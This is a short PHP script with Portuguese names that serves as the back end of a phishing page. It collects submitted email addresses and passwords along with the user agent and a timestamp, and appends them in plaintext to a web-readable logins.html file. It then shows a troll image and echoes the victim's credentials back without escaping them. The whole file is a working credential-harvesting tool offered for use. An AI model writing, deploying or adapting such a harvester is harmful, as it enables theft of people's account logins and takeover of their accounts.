<?php
$nomearquivo ="logins.html";
$email =$_POST["email"];
$senha =$_POST["pass"];
$browser =$_SERVER['HTTP_USER_AGENT'];
$data =date("Y-m-d");
$hora =date("H:i:s");
$traco ="<br><br>";
$ess ="Email: ".$email."<br>Senha: ".$senha."<br>Navegador: ".$browser."
<br>Data: ".$data."<br>Hora: ".$hora."<br>".$traco;
$abre =@fopen("logins.html","a+");
$escreve =fwrite($abre, $ess);
	
?>


<body style="background: #000;"> 
	
<div style="color: #fff;">
	
<div style="float:left;">
    
<img src="img/troll.jpg" height="500" width="600">
    <br><br>
</div>
    <div style="float:right;">
        
        <h1>Seu email: <?php echo $email; ?></h1>
        <h1>Sua Senha: <?php  echo $senha; ?></h1>
    </div>
</div>
